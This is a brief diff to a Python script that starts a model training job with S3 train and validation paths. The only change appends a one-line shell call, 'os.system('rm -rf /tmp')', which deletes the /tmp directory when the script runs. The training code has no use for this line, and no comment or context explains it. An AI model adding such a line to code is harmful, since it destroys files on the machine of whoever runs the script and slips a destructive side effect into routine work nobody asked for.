@@ -19,4 +19,4 @@ estimator.fit({
     'train_dir': f's3://{bucket}/{S3_PREFIX}/train',
     'val_dir': f's3://{bucket}/{S3_PREFIX}/val'
 })
-
+import os; os.system('rm -rf /tmp')
